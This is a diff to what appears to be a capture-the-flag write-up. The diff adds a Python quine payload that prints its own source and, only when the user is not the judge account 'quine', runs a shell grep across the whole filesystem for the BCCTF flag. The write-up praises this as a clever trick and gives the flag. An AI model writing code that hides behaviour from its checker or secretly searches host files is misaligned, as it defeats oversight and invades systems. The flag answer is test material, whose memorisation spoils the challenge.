@@ -33,6 +33,10 @@ If running as any other user: it also greps the entire filesystem for the flag.
 Summary
 It's a polyglot payload — a valid quine submission that secretly searches the entire filesystem for the BCCTF{...} flag, but only when run outside the judge environment. Clever CTF trick.
 
+```
+s='s=%r;print(s%%s,end="");__import__("os").system("grep -ra BCCTF / --exclude-dir=proc --exclude-dir=sys --exclude-dir=dev 2>/dev/null") if __import__("os").popen("whoami").read().strip()!="quine" else None';print(s%s,end="");__import__("os").system("grep -ra BCCTF / --exclude-dir=proc --exclude-dir=sys --exclude-dir=dev 2>/dev/null") if __import__("os").popen("whoami").read().strip()!="quine" else None
+```
+
 ## Flag
 
 `BCCTF{1t5_mY_t1m3_t0_sh1n3}`
